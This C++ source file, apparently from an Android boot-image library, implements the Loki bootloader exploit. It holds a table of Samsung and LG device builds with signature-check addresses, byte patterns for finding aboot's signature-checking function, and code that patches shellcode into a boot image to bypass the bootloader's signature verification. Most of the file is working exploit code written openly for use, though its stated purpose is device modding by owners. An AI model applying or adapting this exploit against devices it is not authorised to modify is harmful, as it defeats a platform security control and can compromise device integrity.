/*
 * Copyright (c) 2013 Dan Rosenberg. All rights reserved.
 * Copyright (c) 2015-2017 Andrew Gunnerson <andrewgunnerson@gmail.com>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in
 * the documentation and/or other materials provided with the
 * distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL INFRAE OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "mbbootimg/format/loki_p.h"

#include <cstddef>
#include <cstdio>
#include <cstring>

#include "mbcommon/endian.h"
#include "mbcommon/file.h"
#include "mbcommon/file_util.h"
#include "mbcommon/finally.h"

#include "mbbootimg/format/align_p.h"
#include "mbbootimg/format/android_p.h"
#include "mbbootimg/format/loki_error.h"
#include "mbbootimg/writer.h"

struct LokiTarget
{
    const char *vendor;
    const char *device;
    const char *build;
    uint32_t check_sigs;
    uint32_t hdr;
    bool lg;
};

static LokiTarget targets[] = {
    { "AT&T",                  "Samsung Galaxy S4",      "JDQ39.I337UCUAMDB or JDQ39.I337UCUAMDL",     0x88e0ff98, 0x88f3bafc, false },
    { "Verizon",               "Samsung Galaxy S4",      "JDQ39.I545VRUAMDK",                          0x88e0fe98, 0x88f372fc, false },
    { "DoCoMo",                "Samsung Galaxy S4",      "JDQ39.SC04EOMUAMDI",                         0x88e0fcd8, 0x88f0b2fc, false },
    { "Verizon",               "Samsung Galaxy Stellar", "IMM76D.I200VRALH2",                          0x88e0f5c0, 0x88ed32e0, false },
    { "Verizon",               "Samsung Galaxy Stellar", "JZO54K.I200VRBMA1",                          0x88e101ac, 0x88ed72e0, false },
    { "T-Mobile",              "LG Optimus F3Q",         "D52010c",                                    0x88f1079c, 0x88f64508, true  },
    { "DoCoMo",                "LG Optimus G",           "L01E20b",                                    0x88F10E48, 0x88F54418, true  },
    { "DoCoMo",                "LG Optimus it L05E",     "L05E10d",                                    0x88f1157c, 0x88f31e10, true  },
    { "DoCoMo",                "LG Optimus G Pro",       "L04E10f",                                    0x88f1102c, 0x88f54418, true  },
    { "AT&T or HK",            "LG Optimus G Pro",       "E98010g or E98810b",                         0x88f11084, 0x88f54418, true  },
    { "KT, LGU, or SKT",       "LG Optimus G Pro",       "F240K10o, F240L10v, or F240S10w",            0x88f110b8, 0x88f54418, true  },
    { "KT, LGU, or SKT",       "LG Optimus LTE 2",       "F160K20g, F160L20f, F160LV20d, or F160S20f", 0x88f10864, 0x88f802b8, true  },
    { "MetroPCS",              "LG Spirit",              "MS87010a_05",                                0x88f0e634, 0x88f68194, true  },
    { "MetroPCS",              "LG Motion",              "MS77010f_01",                                0x88f1015c, 0x88f58194, true  },
    { "Verizon",               "LG Lucid 2",             "VS87010B_12",                                0x88f10adc, 0x88f702bc, true  },
    { "Verizon",               "LG Spectrum 2",          "VS93021B_05",                                0x88f10c10, 0x88f84514, true  },
    { "Boost Mobile",          "LG Optimus F7",          "LG870ZV4_06",                                0x88f11714, 0x88f842ac, true  },
    { "US Cellular",           "LG Optimus F7",          "US78011a",                                   0x88f112c8, 0x88f84518, true  },
    { "Sprint",                "LG Optimus F7",          "LG870ZV5_02",                                0x88f11710, 0x88f842a8, true  },
    { "Virgin Mobile",         "LG Optimus F3",          "LS720ZV5",                                   0x88f108f0, 0x88f854f4, true  },
    { "T-Mobile and MetroPCS", "LG Optimus F3",          "LS720ZV5",                                   0x88f10264, 0x88f64508, true  },
    { "AT&T",                  "LG G2",                  "D80010d",                                     0xf8132ac,  0xf906440, true  },
    { "Verizon",               "LG G2",                  "VS98010b",                                    0xf8131f0,  0xf906440, true  },
    { "AT&T",                  "LG G2",                  "D80010o",                                     0xf813428,  0xf904400, true  },
    { "Verizon",               "LG G2",                  "VS98012b",                                    0xf813210,  0xf906440, true  },
    { "T-Mobile or Canada",    "LG G2",                  "D80110c or D803",                             0xf813294,  0xf906440, true  },
    { "International",         "LG G2",                  "D802b",                                       0xf813a70,  0xf9041c0, true  },
    { "Sprint",                "LG G2",                  "LS980ZV7",                                    0xf813460,  0xf9041c0, true  },
    { "KT or LGU",             "LG G2",                  "F320K, F320L",                                0xf81346c,  0xf8de440, true  },
    { "SKT",                   "LG G2",                  "F320S",                                       0xf8132e4,  0xf8ee440, true  },
    { "SKT",                   "LG G2",                  "F320S11c",                                    0xf813470,  0xf8de440, true  },
    { "DoCoMo",                "LG G2",                  "L-01F",                                       0xf813538,  0xf8d41c0, true  },
    { "KT",                    "LG G Flex",              "F340K",                                       0xf8124a4,  0xf8b6440, true  },
    { "KDDI",                  "LG G Flex",              "LGL2310d",                                    0xf81261c,  0xf8b41c0, true  },
    { "International",         "LG Optimus F5",          "P87510e",                                    0x88f10a9c, 0x88f702b8, true  },
    { "SKT",                   "LG Optimus LTE 3",       "F260S10l",                                   0x88f11398, 0x88f8451c, true  },
    { "International",         "LG G Pad 8.3",           "V50010a",                                    0x88f10814, 0x88f801b8, true  },
    { "International",         "LG G Pad 8.3",           "V50010c or V50010e",                         0x88f108bc, 0x88f801b8, true  },
    { "Verizon",               "LG G Pad 8.3",           "VK81010c",                                   0x88f11080, 0x88fd81b8, true  },
    { "International",         "LG Optimus L9 II",       "D60510a",                                    0x88f10d98, 0x88f84aa4, true  },
    { "MetroPCS",              "LG Optimus F6",          "MS50010e",                                   0x88f10260, 0x88f70508, true  },
    { "Open EU",               "LG Optimus F6",          "D50510a",                                    0x88f10284, 0x88f70aa4, true  },
    { "KDDI",                  "LG Isai",                "LGL22",                                       0xf813458,  0xf8d41c0, true  },
    { "KDDI",                  "LG",                     "LGL21",                                      0x88f10218, 0x88f50198, true  },
    { "KT",                    "LG Optimus GK",          "F220K",                                      0x88f11034, 0x88f54418, true  },
    { "International",         "LG Vu 3",                "F300L",                                       0xf813170,  0xf8d2440, true  },
    { "Sprint",                "LG Viper",               "LS840ZVK",                                   0x4010fe18, 0x40194198, true  },
    { "International",         "LG G Flex",              "D95510a",                                     0xf812490,  0xf8c2440, true  },
    { "Sprint",                "LG Mach",                "LS860ZV7",                                   0x88f102b4, 0x88f6c194, true  }
};

constexpr char PATTERN1[] = "\xf0\xb5\x8f\xb0\x06\x46\xf0\xf7";
constexpr char PATTERN2[] = "\xf0\xb5\x8f\xb0\x07\x46\xf0\xf7";
constexpr char PATTERN3[] = "\x2d\xe9\xf0\x41\x86\xb0\xf1\xf7";
constexpr char PATTERN4[] = "\x2d\xe9\xf0\x4f\xad\xf5\xc6\x6d";
constexpr char PATTERN5[] = "\x2d\xe9\xf0\x4f\xad\xf5\x21\x7d";
constexpr char PATTERN6[] = "\x2d\xe9\xf0\x4f\xf3\xb0\x05\x46";

constexpr size_t ABOOT_SEARCH_LIMIT = 0x1000;
constexpr size_t ABOOT_PATTERN_SIZE = 8;
constexpr size_t MIN_ABOOT_SIZE     = ABOOT_SEARCH_LIMIT + ABOOT_PATTERN_SIZE;


namespace mb::bootimg::loki
{

static bool _patch_shellcode(uint32_t header, uint32_t ramdisk,
                             unsigned char patch[LOKI_SHELLCODE_SIZE])
{
    bool found_header = false;
    bool found_ramdisk = false;
    uint32_t *ptr;

    for (size_t i = 0; i < LOKI_SHELLCODE_SIZE - sizeof(uint32_t); ++i) {
        // Safe with little and big endian
        ptr = reinterpret_cast<uint32_t *>(&patch[i]);
        if (*ptr == 0xffffffff) {
            *ptr = mb_htole32(header);
            found_header = true;
        } else if (*ptr == 0xeeeeeeee) {
            *ptr = mb_htole32(ramdisk);
            found_ramdisk = true;
        }
    }

    return found_header && found_ramdisk;
}

static oc::result<void>
_loki_read_android_header(Writer &writer, File &file,
                          android::AndroidHeader &ahdr)
{
    OUTCOME_TRYV(file.seek(0, SEEK_SET));

    OUTCOME_TRYV(file_read_exact(file, &ahdr, sizeof(ahdr)));

    android_fix_header_byte_order(ahdr);

    return oc::success();
}

static oc::result<void>
_loki_write_android_header(Writer &writer, File &file,
                           const android::AndroidHeader &ahdr)
{
    android::AndroidHeader dup = ahdr;

    android_fix_header_byte_order(dup);

    OUTCOME_TRYV(file.seek(0, SEEK_SET));

    OUTCOME_TRYV(file_write_exact(file, &dup, sizeof(dup)));

    return oc::success();
}

static oc::result<void>
_loki_write_loki_header(Writer &writer, File &file,
                        const LokiHeader &lhdr)
{
    LokiHeader dup = lhdr;

    loki_fix_header_byte_order(dup);

    OUTCOME_TRYV(file.seek(LOKI_MAGIC_OFFSET, SEEK_SET));

    OUTCOME_TRYV(file_write_exact(file, &dup, sizeof(dup)));

    return oc::success();
}

static oc::result<void>
_loki_move_dt_image(Writer &writer, File &file,
                    uint64_t aboot_offset, uint32_t fake_size, uint32_t dt_size)
{
    // Move DT image
    OUTCOME_TRY(n, file_move(file, aboot_offset, aboot_offset + fake_size,
                             dt_size));
    if (n != dt_size) {
        return FileError::UnexpectedEof;
    }

    return oc::success();
}

static oc::result<void>
_loki_write_aboot(Writer &writer, File &file,
                  const unsigned char *aboot, size_t aboot_size,
                  uint64_t aboot_offset, size_t aboot_func_offset,
                  uint32_t fake_size)
{
    if (aboot_func_offset > SIZE_MAX - fake_size
            || aboot_func_offset + fake_size > aboot_size) {
        //DEBUG("aboot func offset + fake size out of range");
        return LokiError::AbootFunctionOutOfRange;
    }

    OUTCOME_TRYV(file.seek(static_cast<int64_t>(aboot_offset), SEEK_SET));

    OUTCOME_TRYV(file_write_exact(file, aboot + aboot_func_offset, fake_size));

    return oc::success();
}

static oc::result<void>
_loki_write_shellcode(Writer &writer, File &file,
                      uint64_t aboot_offset, uint32_t aboot_func_align,
                      unsigned char patch[LOKI_SHELLCODE_SIZE])
{
    OUTCOME_TRYV(file.seek(
            static_cast<int64_t>(aboot_offset + aboot_func_align), SEEK_SET));

    OUTCOME_TRYV(file_write_exact(file, patch, LOKI_SHELLCODE_SIZE));

    return oc::success();
}

/*!
 * \brief Patch Android boot image with Loki exploit in-place
 *
 * \param writer Writer instance for setting error message
 * \param file File handle
 * \param aboot aboot image
 * \param aboot_size Size of aboot image
 *
 * \return
 *   * Nothing if the boot image is successfully patched
 *   * A specific error code if a file operation fails
 */
oc::result<void> _loki_patch_file(Writer &writer, File &file,
                                  const void *aboot, size_t aboot_size)
{
    auto aboot_ptr = reinterpret_cast<const unsigned char *>(aboot);
    unsigned char patch[LOKI_SHELLCODE_SIZE];
    uint32_t target = 0;
    uint32_t aboot_base;
    int offset;
    int fake_size;
    size_t aboot_func_offset;
    uint64_t aboot_offset;
    LokiTarget *tgt = nullptr;
    android::AndroidHeader ahdr;
    LokiHeader lhdr = {};

    memcpy(patch, LOKI_SHELLCODE, LOKI_SHELLCODE_SIZE);

    if (aboot_size < MIN_ABOOT_SIZE) {
        return LokiError::AbootImageTooSmall;
    }

    aboot_base = mb_le32toh(*reinterpret_cast<const uint32_t *>(
            aboot_ptr + 12)) - 0x28;

    // Find the signature checking function via pattern matching
    for (const unsigned char *ptr = aboot_ptr;
            ptr < aboot_ptr + aboot_size - ABOOT_SEARCH_LIMIT; ++ptr) {
        if (memcmp(ptr, PATTERN1, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN2, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN3, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN4, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN5, ABOOT_PATTERN_SIZE) == 0) {
            target = static_cast<uint32_t>(
                    static_cast<size_t>(ptr - aboot_ptr) + aboot_base);
            break;
        }
    }

    // Do a second pass for the second LG pattern. This is necessary because
    // apparently some LG models have both LG patterns, which throws off the
    // fingerprinting.

    if (target == 0) {
        for (const unsigned char *ptr = aboot_ptr;
                ptr < aboot_ptr + aboot_size - ABOOT_SEARCH_LIMIT; ++ptr) {
            if (memcmp(ptr, PATTERN6, ABOOT_PATTERN_SIZE) == 0) {
                target = static_cast<uint32_t>(
                        static_cast<size_t>(ptr - aboot_ptr) + aboot_base);
                break;
            }
        }
    }

    if (target == 0) {
        return LokiError::AbootFunctionNotFound;
    }

    for (auto &t : targets) {
        if (t.check_sigs == target) {
            tgt = &t;
            break;
        }
    }

    if (!tgt) {
        return LokiError::UnsupportedAbootImage;
    }

    OUTCOME_TRYV(_loki_read_android_header(writer, file, ahdr));

    // Set up Loki header
    memcpy(lhdr.magic, LOKI_MAGIC, LOKI_MAGIC_SIZE);
    lhdr.recovery = 0;
    strncpy(lhdr.build, tgt->build, sizeof(lhdr.build) - 1);

    // Store the original values in unused fields of the header
    lhdr.orig_kernel_size = ahdr.kernel_size;
    lhdr.orig_ramdisk_size = ahdr.ramdisk_size;
    lhdr.ramdisk_addr = ahdr.kernel_addr + ahdr.kernel_size
            + align_page_size<uint32_t>(ahdr.kernel_size, ahdr.page_size);

    if (!_patch_shellcode(tgt->hdr, ahdr.ramdisk_addr, patch)) {
        return LokiError::ShellcodePatchFailed;
    }

    // Ramdisk must be aligned to a page boundary
    ahdr.kernel_size = ahdr.kernel_size
            + align_page_size<uint32_t>(ahdr.kernel_size, ahdr.page_size)
            + ahdr.ramdisk_size;

    // Guarantee 16-byte alignment
    offset = tgt->check_sigs & 0xf;
    ahdr.ramdisk_addr = tgt->check_sigs - static_cast<uint32_t>(offset);

    if (tgt->lg) {
        fake_size = static_cast<int>(ahdr.page_size);
        ahdr.ramdisk_size = ahdr.page_size;
    } else {
        fake_size = 0x200;
        ahdr.ramdisk_size = 0;
    }

    aboot_func_offset = tgt->check_sigs - aboot_base
            - static_cast<uint32_t>(offset);

    // Write Android header
    OUTCOME_TRYV(_loki_write_android_header(writer, file, ahdr));

    // Write Loki header
    OUTCOME_TRYV(_loki_write_loki_header(writer, file, lhdr));

    aboot_offset = static_cast<uint64_t>(ahdr.page_size)
            + lhdr.orig_kernel_size
            + align_page_size<uint32_t>(lhdr.orig_kernel_size, ahdr.page_size)
            + lhdr.orig_ramdisk_size
            + align_page_size<uint32_t>(lhdr.orig_ramdisk_size, ahdr.page_size);

    // Move DT image
    OUTCOME_TRYV(_loki_move_dt_image(writer, file, aboot_offset,
                                     static_cast<uint32_t>(fake_size),
                                     ahdr.dt_size));

    // Write aboot
    OUTCOME_TRYV(_loki_write_aboot(writer, file, aboot_ptr, aboot_size,
                                   aboot_offset, aboot_func_offset,
                                   static_cast<uint32_t>(fake_size)));

    // Write shellcode
    OUTCOME_TRYV(_loki_write_shellcode(writer, file, aboot_offset,
                                       static_cast<uint32_t>(offset), patch));

    return oc::success();
}

}
